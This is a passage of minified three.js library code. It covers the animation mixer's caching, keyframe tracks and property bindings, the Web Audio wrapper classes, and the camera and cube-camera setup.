e=b[c];0===--e.useCount&&(e.restoreOriginalState(),this._takeBackBinding(e))}this._takeBackAction(a)}},_initMemoryManager:function(){this._actions=[];this._nActiveActions=0;this._actionsByClip={};this._bindings=[];this._nActiveBindings=0;this._bindingsByRootAndName={};this._controlInterpolants=[];this._nActiveControlInterpolants=0;var a=this;this.stats={actions:{get total(){return a._actions.length},\nget inUse(){return a._nActiveActions}},bindings:{get total(){return a._bindings.length},get inUse(){return a._nActiveBindings}},controlInterpolants:{get total(){return a._controlInterpolants.length},get inUse(){return a._nActiveControlInterpolants}}}},_isActiveAction:function(a){a=a._cacheIndex;return null!==a&&a<this._nActiveActions},_addInactiveAction:function(a,b,c){var d=this._actions,e=this._actionsByClip,f=e[b];void 0===f?(f={knownActions:[a],actionByRoot:{}},a._byClipCacheIndex=0,e[b]=f):(b=\nf.knownActions,a._byClipCacheIndex=b.length,b.push(a));a._cacheIndex=d.length;d.push(a);f.actionByRoot[c]=a},_removeInactiveAction:function(a){var b=this._actions,c=b[b.length-1],d=a._cacheIndex;c._cacheIndex=d;b[d]=c;b.pop();a._cacheIndex=null;var c=a._clip.uuid,d=this._actionsByClip,e=d[c],f=e.knownActions,g=f[f.length-1],h=a._byClipCacheIndex;g._byClipCacheIndex=h;f[h]=g;f.pop();a._byClipCacheIndex=null;delete e.actionByRoot[(b._localRoot||this._root).uuid];0===f.length&&delete d[c];this._removeInactiveBindingsForAction(a)},\n_removeInactiveBindingsForAction:function(a){a=a._propertyBindings;for(var b=0,c=a.length;b!==c;++b){var d=a[b];0===--d.referenceCount&&this._removeInactiveBinding(d)}},_lendAction:function(a){var b=this._actions,c=a._cacheIndex,d=this._nActiveActions++,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_takeBackAction:function(a){var b=this._actions,c=a._cacheIndex,d=--this._nActiveActions,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_addInactiveBinding:function(a,b,c){var d=this._bindingsByRootAndName,\ne=d[b],f=this._bindings;void 0===e&&(e={},d[b]=e);e[c]=a;a._cacheIndex=f.length;f.push(a)},_removeInactiveBinding:function(a){var b=this._bindings,c=a.binding,d=c.rootNode.uuid,c=c.path,e=this._bindingsByRootAndName,f=e[d],g=b[b.length-1];a=a._cacheIndex;g._cacheIndex=a;b[a]=g;b.pop();delete f[c];a:{for(var h in f)break a;delete e[d]}},_lendBinding:function(a){var b=this._bindings,c=a._cacheIndex,d=this._nActiveBindings++,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_takeBackBinding:function(a){var b=\nthis._bindings,c=a._cacheIndex,d=--this._nActiveBindings,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_lendControlInterpolant:function(){var a=this._controlInterpolants,b=this._nActiveControlInterpolants++,c=a[b];void 0===c&&(c=new THREE.LinearInterpolant(new Float32Array(2),new Float32Array(2),1,this._controlInterpolantsResultBuffer),c.__cacheIndex=b,a[b]=c);return c},_takeBackControlInterpolant:function(a){var b=this._controlInterpolants,c=a.__cacheIndex,d=--this._nActiveControlInterpolants,\ne=b[d];a.__cacheIndex=d;b[d]=a;e.__cacheIndex=c;b[c]=e},_controlInterpolantsResultBuffer:new Float32Array(1)});\nTHREE.AnimationObjectGroup=function(a){this.uuid=THREE.Math.generateUUID();this._objects=Array.prototype.slice.call(arguments);this.nCachedObjects_=0;var b={};this._indicesByUUID=b;for(var c=0,d=arguments.length;c!==d;++c)b[arguments[c].uuid]=c;this._paths=[];this._parsedPaths=[];this._bindings=[];this._bindingsIndicesByPath={};var e=this;this.stats={objects:{get total(){return e._objects.length},get inUse(){return this.total-e.nCachedObjects_}},get bindingsPerObject(){return e._bindings.length}}};\nTHREE.AnimationObjectGroup.prototype={constructor:THREE.AnimationObjectGroup,add:function(a){for(var b=this._objects,c=b.length,d=this.nCachedObjects_,e=this._indicesByUUID,f=this._paths,g=this._parsedPaths,h=this._bindings,k=h.length,l=0,n=arguments.length;l!==n;++l){var p=arguments[l],m=p.uuid,q=e[m];if(void 0===q){q=c++;e[m]=q;b.push(p);for(var m=0,r=k;m!==r;++m)h[m].push(new THREE.PropertyBinding(p,f[m],g[m]))}else if(q<d){var s=b[q],t=--d,r=b[t];e[r.uuid]=q;b[q]=r;e[m]=t;b[t]=p;m=0;for(r=k;m!==\nr;++m){var u=h[m],v=u[q];u[q]=u[t];void 0===v&&(v=new THREE.PropertyBinding(p,f[m],g[m]));u[t]=v}}else b[q]!==s&&console.error(\"Different objects with the same UUID detected. Clean the caches or recreate your infrastructure when reloading scenes...\")}this.nCachedObjects_=d},remove:function(a){for(var b=this._objects,c=this.nCachedObjects_,d=this._indicesByUUID,e=this._bindings,f=e.length,g=0,h=arguments.length;g!==h;++g){var k=arguments[g],l=k.uuid,n=d[l];if(void 0!==n&&n>=c){var p=c++,m=b[p];d[m.uuid]=\nn;b[n]=m;d[l]=p;b[p]=k;k=0;for(l=f;k!==l;++k){var m=e[k],q=m[n];m[n]=m[p];m[p]=q}}}this.nCachedObjects_=c},uncache:function(a){for(var b=this._objects,c=b.length,d=this.nCachedObjects_,e=this._indicesByUUID,f=this._bindings,g=f.length,h=0,k=arguments.length;h!==k;++h){var l=arguments[h].uuid,n=e[l];if(void 0!==n)if(delete e[l],n<d){var l=--d,p=b[l],m=--c,q=b[m];e[p.uuid]=n;b[n]=p;e[q.uuid]=l;b[l]=q;b.pop();p=0;for(q=g;p!==q;++p){var r=f[p],s=r[m];r[n]=r[l];r[l]=s;r.pop()}}else for(m=--c,q=b[m],e[q.uuid]=\nn,b[n]=q,b.pop(),p=0,q=g;p!==q;++p)r=f[p],r[n]=r[m],r.pop()}this.nCachedObjects_=d},subscribe_:function(a,b){var c=this._bindingsIndicesByPath,d=c[a],e=this._bindings;if(void 0!==d)return e[d];var f=this._paths,g=this._parsedPaths,h=this._objects,k=this.nCachedObjects_,l=Array(h.length),d=e.length;c[a]=d;f.push(a);g.push(b);e.push(l);c=k;for(d=h.length;c!==d;++c)l[c]=new THREE.PropertyBinding(h[c],a,b);return l},unsubscribe_:function(a){var b=this._bindingsIndicesByPath,c=b[a];if(void 0!==c){var d=\nthis._paths,e=this._parsedPaths,f=this._bindings,g=f.length-1,h=f[g];b[a[g]]=c;f[c]=h;f.pop();e[c]=e[g];e.pop();d[c]=d[g];d.pop()}}};\nTHREE.AnimationUtils={arraySlice:function(a,b,c){return THREE.AnimationUtils.isTypedArray(a)?new a.constructor(a.subarray(b,c)):a.slice(b,c)},convertArray:function(a,b,c){return!a||!c&&a.constructor===b?a:\"number\"===typeof b.BYTES_PER_ELEMENT?new b(a):Array.prototype.slice.call(a)},isTypedArray:function(a){return ArrayBuffer.isView(a)&&!(a instanceof DataView)},getKeyframeOrder:function(a){for(var b=a.length,c=Array(b),d=0;d!==b;++d)c[d]=d;c.sort(function(b,c){return a[b]-a[c]});return c},sortedArray:function(a,\nb,c){for(var d=a.length,e=new a.constructor(d),f=0,g=0;g!==d;++f)for(var h=c[f]*b,k=0;k!==b;++k)e[g++]=a[h+k];return e},flattenJSON:function(a,b,c,d){for(var e=1,f=a[0];void 0!==f&&void 0===f[d];)f=a[e++];if(void 0!==f){var g=f[d];if(void 0!==g)if(Array.isArray(g)){do g=f[d],void 0!==g&&(b.push(f.time),c.push.apply(c,g)),f=a[e++];while(void 0!==f)}else if(void 0!==g.toArray){do g=f[d],void 0!==g&&(b.push(f.time),g.toArray(c,c.length)),f=a[e++];while(void 0!==f)}else{do g=f[d],void 0!==g&&(b.push(f.time),\nc.push(g)),f=a[e++];while(void 0!==f)}}}};THREE.KeyframeTrack=function(a,b,c,d){if(void 0===a)throw Error(\"track name is undefined\");if(void 0===b||0===b.length)throw Error(\"no keyframes in track named \"+a);this.name=a;this.times=THREE.AnimationUtils.convertArray(b,this.TimeBufferType);this.values=THREE.AnimationUtils.convertArray(c,this.ValueBufferType);this.setInterpolation(d||this.DefaultInterpolation);this.validate();this.optimize()};\nTHREE.KeyframeTrack.prototype={constructor:THREE.KeyframeTrack,TimeBufferType:Float32Array,ValueBufferType:Float32Array,DefaultInterpolation:THREE.InterpolateLinear,InterpolantFactoryMethodDiscrete:function(a){return new THREE.DiscreteInterpolant(this.times,this.values,this.getValueSize(),a)},InterpolantFactoryMethodLinear:function(a){return new THREE.LinearInterpolant(this.times,this.values,this.getValueSize(),a)},InterpolantFactoryMethodSmooth:function(a){return new THREE.CubicInterpolant(this.times,\nthis.values,this.getValueSize(),a)},setInterpolation:function(a){var b;switch(a){case THREE.InterpolateDiscrete:b=this.InterpolantFactoryMethodDiscrete;break;case THREE.InterpolateLinear:b=this.InterpolantFactoryMethodLinear;break;case THREE.InterpolateSmooth:b=this.InterpolantFactoryMethodSmooth}if(void 0===b){b=\"unsupported interpolation for \"+this.ValueTypeName+\" keyframe track named \"+this.name;if(void 0===this.createInterpolant)if(a!==this.DefaultInterpolation)this.setInterpolation(this.DefaultInterpolation);\nelse throw Error(b);console.warn(b)}else this.createInterpolant=b},getInterpolation:function(){switch(this.createInterpolant){case this.InterpolantFactoryMethodDiscrete:return THREE.InterpolateDiscrete;case this.InterpolantFactoryMethodLinear:return THREE.InterpolateLinear;case this.InterpolantFactoryMethodSmooth:return THREE.InterpolateSmooth}},getValueSize:function(){return this.values.length/this.times.length},shift:function(a){if(0!==a)for(var b=this.times,c=0,d=b.length;c!==d;++c)b[c]+=a;return this},\nscale:function(a){if(1!==a)for(var b=this.times,c=0,d=b.length;c!==d;++c)b[c]*=a;return this},trim:function(a,b){for(var c=this.times,d=c.length,e=0,f=d-1;e!==d&&c[e]<a;)++e;for(;-1!==f&&c[f]>b;)--f;++f;if(0!==e||f!==d)e>=f&&(f=Math.max(f,1),e=f-1),d=this.getValueSize(),this.times=THREE.AnimationUtils.arraySlice(c,e,f),this.values=THREE.AnimationUtils.arraySlice(this.values,e*d,f*d);return this},validate:function(){var a=!0,b=this.getValueSize();0!==b-Math.floor(b)&&(console.error(\"invalid value size in track\",\nthis),a=!1);var c=this.times,b=this.values,d=c.length;0===d&&(console.error(\"track is empty\",this),a=!1);for(var e=null,f=0;f!==d;f++){var g=c[f];if(\"number\"===typeof g&&isNaN(g)){console.error(\"time is not a valid number\",this,f,g);a=!1;break}if(null!==e&&e>g){console.error(\"out of order keys\",this,f,g,e);a=!1;break}e=g}if(void 0!==b&&THREE.AnimationUtils.isTypedArray(b))for(f=0,c=b.length;f!==c;++f)if(d=b[f],isNaN(d)){console.error(\"value is not a valid number\",this,f,d);a=!1;break}return a},optimize:function(){for(var a=\nthis.times,b=this.values,c=this.getValueSize(),d=1,e=1,f=a.length-1;e<=f;++e){var g=!1,h=a[e];if(h!==a[e+1]&&(1!==e||h!==h[0]))for(var k=e*c,l=k-c,n=k+c,h=0;h!==c;++h){var p=b[k+h];if(p!==b[l+h]||p!==b[n+h]){g=!0;break}}if(g){if(e!==d)for(a[d]=a[e],g=e*c,k=d*c,h=0;h!==c;++h)b[k+h]=b[g+h];++d}}d!==a.length&&(this.times=THREE.AnimationUtils.arraySlice(a,0,d),this.values=THREE.AnimationUtils.arraySlice(b,0,d*c));return this}};\nObject.assign(THREE.KeyframeTrack,{parse:function(a){if(void 0===a.type)throw Error(\"track type undefined, can not parse\");var b=THREE.KeyframeTrack._getTrackTypeForValueTypeName(a.type);if(void 0===a.times){var c=[],d=[];THREE.AnimationUtils.flattenJSON(a.keys,c,d,\"value\");a.times=c;a.values=d}return void 0!==b.parse?b.parse(a):new b(a.name,a.times,a.values,a.interpolation)},toJSON:function(a){var b=a.constructor;if(void 0!==b.toJSON)b=b.toJSON(a);else{var b={name:a.name,times:THREE.AnimationUtils.convertArray(a.times,\nArray),values:THREE.AnimationUtils.convertArray(a.values,Array)},c=a.getInterpolation();c!==a.DefaultInterpolation&&(b.interpolation=c)}b.type=a.ValueTypeName;return b},_getTrackTypeForValueTypeName:function(a){switch(a.toLowerCase()){case \"scalar\":case \"double\":case \"float\":case \"number\":case \"integer\":return THREE.NumberKeyframeTrack;case \"vector\":case \"vector2\":case \"vector3\":case \"vector4\":return THREE.VectorKeyframeTrack;case \"color\":return THREE.ColorKeyframeTrack;case \"quaternion\":return THREE.QuaternionKeyframeTrack;\ncase \"bool\":case \"boolean\":return THREE.BooleanKeyframeTrack;case \"string\":return THREE.StringKeyframeTrack}throw Error(\"Unsupported typeName: \"+a);}});THREE.PropertyBinding=function(a,b,c){this.path=b;this.parsedPath=c||THREE.PropertyBinding.parseTrackName(b);this.node=THREE.PropertyBinding.findNode(a,this.parsedPath.nodeName)||a;this.rootNode=a};\nTHREE.PropertyBinding.prototype={constructor:THREE.PropertyBinding,getValue:function(a,b){this.bind();this.getValue(a,b)},setValue:function(a,b){this.bind();this.setValue(a,b)},bind:function(){var a=this.node,b=this.parsedPath,c=b.objectName,d=b.propertyName,e=b.propertyIndex;a||(this.node=a=THREE.PropertyBinding.findNode(this.rootNode,b.nodeName)||this.rootNode);this.getValue=this._getValue_unavailable;this.setValue=this._setValue_unavailable;if(a){if(c){var f=b.objectIndex;switch(c){case \"materials\":if(!a.material){console.error(\"  can not bind to material as node does not have a material\",\nthis);return}if(!a.material.materials){console.error(\"  can not bind to material.materials as node.material does not have a materials array\",this);return}a=a.material.materials;break;case \"bones\":if(!a.skeleton){console.error(\"  can not bind to bones as node does not have a skeleton\",this);return}a=a.skeleton.bones;for(c=0;c<a.length;c++)if(a[c].name===f){f=c;break}break;default:if(void 0===a[c]){console.error(\"  can not bind to objectName of node, undefined\",this);return}a=a[c]}if(void 0!==f){if(void 0===\na[f]){console.error(\"  trying to bind to objectIndex of objectName, but is undefined:\",this,a);return}a=a[f]}}f=a[d];if(void 0===f)console.error(\"  trying to update property for track: \"+b.nodeName+\".\"+d+\" but it wasn't found.\",a);else{b=this.Versioning.None;void 0!==a.needsUpdate?(b=this.Versioning.NeedsUpdate,this.targetObject=a):void 0!==a.matrixWorldNeedsUpdate&&(b=this.Versioning.MatrixWorldNeedsUpdate,this.targetObject=a);c=this.BindingType.Direct;if(void 0!==e){if(\"morphTargetInfluences\"===\nd){if(!a.geometry){console.error(\"  can not bind to morphTargetInfluences becasuse node does not have a geometry\",this);return}if(!a.geometry.morphTargets){console.error(\"  can not bind to morphTargetInfluences becasuse node does not have a geometry.morphTargets\",this);return}for(c=0;c<this.node.geometry.morphTargets.length;c++)if(a.geometry.morphTargets[c].name===e){e=c;break}}c=this.BindingType.ArrayElement;this.resolvedProperty=f;this.propertyIndex=e}else void 0!==f.fromArray&&void 0!==f.toArray?\n(c=this.BindingType.HasFromToArray,this.resolvedProperty=f):void 0!==f.length?(c=this.BindingType.EntireArray,this.resolvedProperty=f):this.propertyName=d;this.getValue=this.GetterByBindingType[c];this.setValue=this.SetterByBindingTypeAndVersioning[c][b]}}else console.error(\"  trying to update node for track: \"+this.path+\" but it wasn't found.\")},unbind:function(){this.node=null;this.getValue=this._getValue_unbound;this.setValue=this._setValue_unbound}};\nObject.assign(THREE.PropertyBinding.prototype,{_getValue_unavailable:function(){},_setValue_unavailable:function(){},_getValue_unbound:THREE.PropertyBinding.prototype.getValue,_setValue_unbound:THREE.PropertyBinding.prototype.setValue,BindingType:{Direct:0,EntireArray:1,ArrayElement:2,HasFromToArray:3},Versioning:{None:0,NeedsUpdate:1,MatrixWorldNeedsUpdate:2},GetterByBindingType:[function(a,b){a[b]=this.node[this.propertyName]},function(a,b){for(var c=this.resolvedProperty,d=0,e=c.length;d!==e;++d)a[b++]=\nc[d]},function(a,b){a[b]=this.resolvedProperty[this.propertyIndex]},function(a,b){this.resolvedProperty.toArray(a,b)}],SetterByBindingTypeAndVersioning:[[function(a,b){this.node[this.propertyName]=a[b]},function(a,b){this.node[this.propertyName]=a[b];this.targetObject.needsUpdate=!0},function(a,b){this.node[this.propertyName]=a[b];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){for(var c=this.resolvedProperty,d=0,e=c.length;d!==e;++d)c[d]=a[b++]},function(a,b){for(var c=this.resolvedProperty,\nd=0,e=c.length;d!==e;++d)c[d]=a[b++];this.targetObject.needsUpdate=!0},function(a,b){for(var c=this.resolvedProperty,d=0,e=c.length;d!==e;++d)c[d]=a[b++];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){this.resolvedProperty[this.propertyIndex]=a[b]},function(a,b){this.resolvedProperty[this.propertyIndex]=a[b];this.targetObject.needsUpdate=!0},function(a,b){this.resolvedProperty[this.propertyIndex]=a[b];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){this.resolvedProperty.fromArray(a,\nb)},function(a,b){this.resolvedProperty.fromArray(a,b);this.targetObject.needsUpdate=!0},function(a,b){this.resolvedProperty.fromArray(a,b);this.targetObject.matrixWorldNeedsUpdate=!0}]]});THREE.PropertyBinding.Composite=function(a,b,c){c=c||THREE.PropertyBinding.parseTrackName(b);this._targetGroup=a;this._bindings=a.subscribe_(b,c)};\nTHREE.PropertyBinding.Composite.prototype={constructor:THREE.PropertyBinding.Composite,getValue:function(a,b){this.bind();var c=this._bindings[this._targetGroup.nCachedObjects_];void 0!==c&&c.getValue(a,b)},setValue:function(a,b){for(var c=this._bindings,d=this._targetGroup.nCachedObjects_,e=c.length;d!==e;++d)c[d].setValue(a,b)},bind:function(){for(var a=this._bindings,b=this._targetGroup.nCachedObjects_,c=a.length;b!==c;++b)a[b].bind()},unbind:function(){for(var a=this._bindings,b=this._targetGroup.nCachedObjects_,\nc=a.length;b!==c;++b)a[b].unbind()}};THREE.PropertyBinding.create=function(a,b,c){return a instanceof THREE.AnimationObjectGroup?new THREE.PropertyBinding.Composite(a,b,c):new THREE.PropertyBinding(a,b,c)};\nTHREE.PropertyBinding.parseTrackName=function(a){var b=/^(([\\w]+\\/)*)([\\w-\\d]+)?(\\.([\\w]+)(\\[([\\w\\d\\[\\]\\_.:\\- ]+)\\])?)?(\\.([\\w.]+)(\\[([\\w\\d\\[\\]\\_. ]+)\\])?)$/,c=b.exec(a);if(!c)throw Error(\"cannot parse trackName at all: \"+a);c.index===b.lastIndex&&b.lastIndex++;b={nodeName:c[3],objectName:c[5],objectIndex:c[7],propertyName:c[9],propertyIndex:c[11]};if(null===b.propertyName||0===b.propertyName.length)throw Error(\"can not parse propertyName from trackName: \"+a);return b};\nTHREE.PropertyBinding.findNode=function(a,b){if(!b||\"\"===b||\"root\"===b||\".\"===b||-1===b||b===a.name||b===a.uuid)return a;if(a.skeleton){var c=function(a){for(var c=0;c<a.bones.length;c++){var d=a.bones[c];if(d.name===b)return d}return null}(a.skeleton);if(c)return c}if(a.children){var d=function(a){for(var c=0;c<a.length;c++){var g=a[c];if(g.name===b||g.uuid===b||(g=d(g.children)))return g}return null};if(c=d(a.children))return c}return null};\nTHREE.PropertyMixer=function(a,b,c){this.binding=a;this.valueSize=c;a=Float64Array;switch(b){case \"quaternion\":b=this._slerp;break;case \"string\":case \"bool\":a=Array;b=this._select;break;default:b=this._lerp}this.buffer=new a(4*c);this._mixBufferRegion=b;this.referenceCount=this.useCount=this.cumulativeWeight=0};\nTHREE.PropertyMixer.prototype={constructor:THREE.PropertyMixer,accumulate:function(a,b){var c=this.buffer,d=this.valueSize,e=a*d+d,f=this.cumulativeWeight;if(0===f){for(f=0;f!==d;++f)c[e+f]=c[f];f=b}else f+=b,this._mixBufferRegion(c,e,0,b/f,d);this.cumulativeWeight=f},apply:function(a){var b=this.valueSize,c=this.buffer;a=a*b+b;var d=this.cumulativeWeight,e=this.binding;this.cumulativeWeight=0;1>d&&this._mixBufferRegion(c,a,3*b,1-d,b);for(var d=b,f=b+b;d!==f;++d)if(c[d]!==c[d+b]){e.setValue(c,a);\nbreak}},saveOriginalState:function(){var a=this.buffer,b=this.valueSize,c=3*b;this.binding.getValue(a,c);for(var d=b;d!==c;++d)a[d]=a[c+d%b];this.cumulativeWeight=0},restoreOriginalState:function(){this.binding.setValue(this.buffer,3*this.valueSize)},_select:function(a,b,c,d,e){if(.5<=d)for(d=0;d!==e;++d)a[b+d]=a[c+d]},_slerp:function(a,b,c,d,e){THREE.Quaternion.slerpFlat(a,b,a,b,a,c,d)},_lerp:function(a,b,c,d,e){for(var f=1-d,g=0;g!==e;++g){var h=b+g;a[h]=a[h]*f+a[c+g]*d}}};\nTHREE.BooleanKeyframeTrack=function(a,b,c){THREE.KeyframeTrack.call(this,a,b,c)};THREE.BooleanKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.BooleanKeyframeTrack,ValueTypeName:\"bool\",ValueBufferType:Array,DefaultInterpolation:THREE.InterpolateDiscrete,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0});THREE.ColorKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\nTHREE.ColorKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.ColorKeyframeTrack,ValueTypeName:\"color\"});THREE.NumberKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};THREE.NumberKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.NumberKeyframeTrack,ValueTypeName:\"number\"});THREE.QuaternionKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\nTHREE.QuaternionKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.QuaternionKeyframeTrack,ValueTypeName:\"quaternion\",DefaultInterpolation:THREE.InterpolateLinear,InterpolantFactoryMethodLinear:function(a){return new THREE.QuaternionLinearInterpolant(this.times,this.values,this.getValueSize(),a)},InterpolantFactoryMethodSmooth:void 0});THREE.StringKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\nTHREE.StringKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.StringKeyframeTrack,ValueTypeName:\"string\",ValueBufferType:Array,DefaultInterpolation:THREE.InterpolateDiscrete,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0});THREE.VectorKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\nTHREE.VectorKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.VectorKeyframeTrack,ValueTypeName:\"vector\"});\nTHREE.Audio=function(a){THREE.Object3D.call(this);this.type=\"Audio\";this.context=a.context;this.source=this.context.createBufferSource();this.source.onended=this.onEnded.bind(this);this.gain=this.context.createGain();this.gain.connect(a.getInput());this.autoplay=!1;this.startTime=0;this.playbackRate=1;this.isPlaying=!1;this.hasPlaybackControl=!0;this.sourceType=\"empty\";this.filters=[]};\nTHREE.Audio.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Audio,getOutput:function(){return this.gain},setNodeSource:function(a){this.hasPlaybackControl=!1;this.sourceType=\"audioNode\";this.source=a;this.connect();return this},setBuffer:function(a){this.source.buffer=a;this.sourceType=\"buffer\";this.autoplay&&this.play();return this},play:function(){if(!0===this.isPlaying)console.warn(\"THREE.Audio: Audio is already playing.\");else if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");\nelse{var a=this.context.createBufferSource();a.buffer=this.source.buffer;a.loop=this.source.loop;a.onended=this.source.onended;a.start(0,this.startTime);a.playbackRate.value=this.playbackRate;this.isPlaying=!0;this.source=a;return this.connect()}},pause:function(){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");else return this.source.stop(),this.startTime=this.context.currentTime,this.isPlaying=!1,this},stop:function(){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");\nelse return this.source.stop(),this.startTime=0,this.isPlaying=!1,this},connect:function(){if(0<this.filters.length){this.source.connect(this.filters[0]);for(var a=1,b=this.filters.length;a<b;a++)this.filters[a-1].connect(this.filters[a]);this.filters[this.filters.length-1].connect(this.getOutput())}else this.source.connect(this.getOutput());return this},disconnect:function(){if(0<this.filters.length){this.source.disconnect(this.filters[0]);for(var a=1,b=this.filters.length;a<b;a++)this.filters[a-\n1].disconnect(this.filters[a]);this.filters[this.filters.length-1].disconnect(this.getOutput())}else this.source.disconnect(this.getOutput());return this},getFilters:function(){return this.filters},setFilters:function(a){a||(a=[]);!0===this.isPlaying?(this.disconnect(),this.filters=a,this.connect()):this.filters=a;return this},getFilter:function(){return this.getFilters()[0]},setFilter:function(a){return this.setFilters(a?[a]:[])},setPlaybackRate:function(a){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");\nelse return this.playbackRate=a,!0===this.isPlaying&&(this.source.playbackRate.value=this.playbackRate),this},getPlaybackRate:function(){return this.playbackRate},onEnded:function(){this.isPlaying=!1},getLoop:function(){return!1===this.hasPlaybackControl?(console.warn(\"THREE.Audio: this Audio has no playback control.\"),!1):this.source.loop},setLoop:function(a){!1===this.hasPlaybackControl?console.warn(\"THREE.Audio: this Audio has no playback control.\"):this.source.loop=a},getVolume:function(){return this.gain.gain.value},\nsetVolume:function(a){this.gain.gain.value=a;return this}});THREE.AudioAnalyser=function(a,b){this.analyser=a.context.createAnalyser();this.analyser.fftSize=void 0!==b?b:2048;this.data=new Uint8Array(this.analyser.frequencyBinCount);a.getOutput().connect(this.analyser)};\nObject.assign(THREE.AudioAnalyser.prototype,{getFrequencyData:function(){this.analyser.getByteFrequencyData(this.data);return this.data},getAverageFrequency:function(){for(var a=0,b=this.getFrequencyData(),c=0;c<b.length;c++)a+=b[c];return a/b.length}});Object.defineProperty(THREE,\"AudioContext\",{get:function(){var a;return function(){void 0===a&&(a=new (window.AudioContext||window.webkitAudioContext));return a}}()});\nTHREE.PositionalAudio=function(a){THREE.Audio.call(this,a);this.panner=this.context.createPanner();this.panner.connect(this.gain)};\nTHREE.PositionalAudio.prototype=Object.assign(Object.create(THREE.Audio.prototype),{constructor:THREE.PositionalAudio,getOutput:function(){return this.panner},getRefDistance:function(){return this.panner.refDistance},setRefDistance:function(a){this.panner.refDistance=a},getRolloffFactor:function(){return this.panner.rolloffFactor},setRolloffFactor:function(a){this.panner.rolloffFactor=a},getDistanceModel:function(){return this.panner.distanceModel},setDistanceModel:function(a){this.panner.distanceModel=\na},getMaxDistance:function(){return this.panner.maxDistance},setMaxDistance:function(a){this.panner.maxDistance=a},updateMatrixWorld:function(){var a=new THREE.Vector3;return function(b){THREE.Object3D.prototype.updateMatrixWorld.call(this,b);a.setFromMatrixPosition(this.matrixWorld);this.panner.setPosition(a.x,a.y,a.z)}}()});\nTHREE.AudioListener=function(){THREE.Object3D.call(this);this.type=\"AudioListener\";this.context=THREE.AudioContext;this.gain=this.context.createGain();this.gain.connect(this.context.destination);this.filter=null};\nTHREE.AudioListener.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.AudioListener,getInput:function(){return this.gain},removeFilter:function(){null!==this.filter&&(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination),this.gain.connect(this.context.destination),this.filter=null)},getFilter:function(){return this.filter},setFilter:function(a){null!==this.filter?(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination)):\nthis.gain.disconnect(this.context.destination);this.filter=a;this.gain.connect(this.filter);this.filter.connect(this.context.destination)},getMasterVolume:function(){return this.gain.gain.value},setMasterVolume:function(a){this.gain.gain.value=a},updateMatrixWorld:function(){var a=new THREE.Vector3,b=new THREE.Quaternion,c=new THREE.Vector3,d=new THREE.Vector3;return function(e){THREE.Object3D.prototype.updateMatrixWorld.call(this,e);e=this.context.listener;var f=this.up;this.matrixWorld.decompose(a,\nb,c);d.set(0,0,-1).applyQuaternion(b);e.setPosition(a.x,a.y,a.z);e.setOrientation(d.x,d.y,d.z,f.x,f.y,f.z)}}()});THREE.Camera=function(){THREE.Object3D.call(this);this.type=\"Camera\";this.matrixWorldInverse=new THREE.Matrix4;this.projectionMatrix=new THREE.Matrix4};THREE.Camera.prototype=Object.create(THREE.Object3D.prototype);THREE.Camera.prototype.constructor=THREE.Camera;\nTHREE.Camera.prototype.getWorldDirection=function(){var a=new THREE.Quaternion;return function(b){b=b||new THREE.Vector3;this.getWorldQuaternion(a);return b.set(0,0,-1).applyQuaternion(a)}}();THREE.Camera.prototype.lookAt=function(){var a=new THREE.Matrix4;return function(b){a.lookAt(this.position,b,this.up);this.quaternion.setFromRotationMatrix(a)}}();THREE.Camera.prototype.clone=function(){return(new this.constructor).copy(this)};\nTHREE.Camera.prototype.copy=function(a){THREE.Object3D.prototype.copy.call(this,a);this.matrixWorldInverse.copy(a.matrixWorldInverse);this.projectionMatrix.copy(a.projectionMatrix);return this};\nTHREE.CubeCamera=function(a,b,c){THREE.Object3D.call(this);this.type=\"CubeCamera\";var d=new THREE.PerspectiveCamera(90,1,a,b);d.up.set(0,-1,0);d.lookAt(new THREE.Vector3(1,0,0));this.add(d);var e=new THREE.PerspectiveCamera(90,1,a,b);e.up.set(0,-1,0);e.lookAt(new THREE.Vector3(-1,0,0));this.add(e);var f=new THREE.PerspectiveCamera(90,1,a,b);f.up.set(0,0,1);f.lookAt(new THREE.Vector3(0,1,0));this.add(f);var g=new THREE.PerspectiveCamera(90,1,a,b);g.up.set(0,0,-1);g.lookAt(new THREE.Vector3(0,-1,0));\nthis.add(g);var h=new THREE.PerspectiveCamera(90,1,a,b);h.up.set(0,-1,0);h.lookAt(new THREE.Vector3(0,0,1));this.add(h);var k=new THREE.PerspectiveCamera(90,1,a,b);k.up.set(0,-1,0);k.lookAt(new THREE.Vector3(0,0,-1));this.add(k);this.renderTarget=new 